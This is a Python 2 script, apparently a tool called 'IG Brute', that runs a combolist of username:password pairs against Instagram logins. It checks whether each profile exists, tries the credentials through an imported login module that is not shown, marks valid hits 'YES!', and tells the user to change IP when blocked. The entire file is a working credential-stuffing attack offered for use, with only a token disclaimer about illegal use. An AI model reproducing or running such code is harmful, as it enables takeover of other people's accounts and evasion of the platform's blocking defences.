from core import login
import requests, sys, os, time

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
# We don't Accept any responsibility for any illegal usage.
AGENT = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/70.0'}
TESTED_users = []
TRYAGAin = []


def cls():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][os.name == 'nt'])


def banner():
    B = '''
  {}        _____ _____   ____             _       
  {}       |_   _/ ____| |  _ \           | | {}  GitHub.com/04x
  {}         | || |  __  | |_) |_ __ _   _| |_ ___ 
  {}         | || | |_ | |  _ <| '__| | | | __/ _ |
  {}        _| || |__| | | |_) | |  | |_| | ||  __/
  {}       |_____\_____| |____/|_|   \__,_|\__\___|
  
  {}    NOte: We don't Accept any responsibility for any illegal usage.                                          
  {}                T.me/SpadSec    {}                           
    '''.format(g, g, y, w, w, r, r, w, y, w)
    return B


def USage():
    A = '''
 {}[{}+{}]{} USAGE: {}python {} {}Combolist.txt{}
    '''.format(w, r, w, y, c, sys.argv[0], c, w)
    return A


def CRACK(combos):
    for Combo in combos:
        username = Combo.split(':')[0]
        password = Combo.split(':')[1]
        check = requests.get('https://instagram.com/{}/'.format(username), timeout=10, headers=AGENT)
        if 'Page Not Found' in str(check.content):
            print('  {}ATTACKING{} ==>{} {}:{} {}=> {}PAGE NOT FOUND!'.format(w, y, c, username, password, w, r))
        else:
            if username in TESTED_users:
                TRYAGAin.append(username + ':' + password)
            else:
                TESTED_users.append(username + ':' + password)
                while True:
                    Log = login.Login(username, password)
                    if Log == 'Problem':
                        print('  {}ATTACKING{} ==>{} {}:{} {}=> {}ERROR in Request Resending...'.format(w, y, c, username, password, w, y))
                    elif Log == 'Nono':
                        print('  {}ATTACKING{} ==>{} {}:{} {}=> {}NO!'.format(w, y, c, username, password, w, r))
                        break
                    elif Log == 'LoggedIN':
                        print('  {}ATTACKING{} ==>{} {}:{} {}=> {}YES!'.format(w, y, c, username, password, w, g))
                        break
                    elif Log == 'Challenge':
                        print('  {}ATTACKING{} ==>{} {}:{} {}=> {}YES!'.format(w, y, c, username, password, w, g))
                        break
                    elif Log == 'Blocked':
                        print('  {}ATTACKING{} ==>{} {}:{} {}=> {}Blocked IP!'.format(w, y, c, username, password, w, r))
                        raw_input('  Change your IP Then continue...')
                    elif Log == 'Oops':
                        print('  {}ATTACKING{} ==>{} {}:{} {}=> {}Oops, an error occurred. Trying again!'.format(w, y, c, username, password, w, y))


if __name__ == '__main__':
    try:
        combos = open(sys.argv[1], 'r').read().splitlines()
    except:
        cls()
        print banner()
        print USage()
        sys.exit()
    cls()
    print banner()
    CRACK(combos)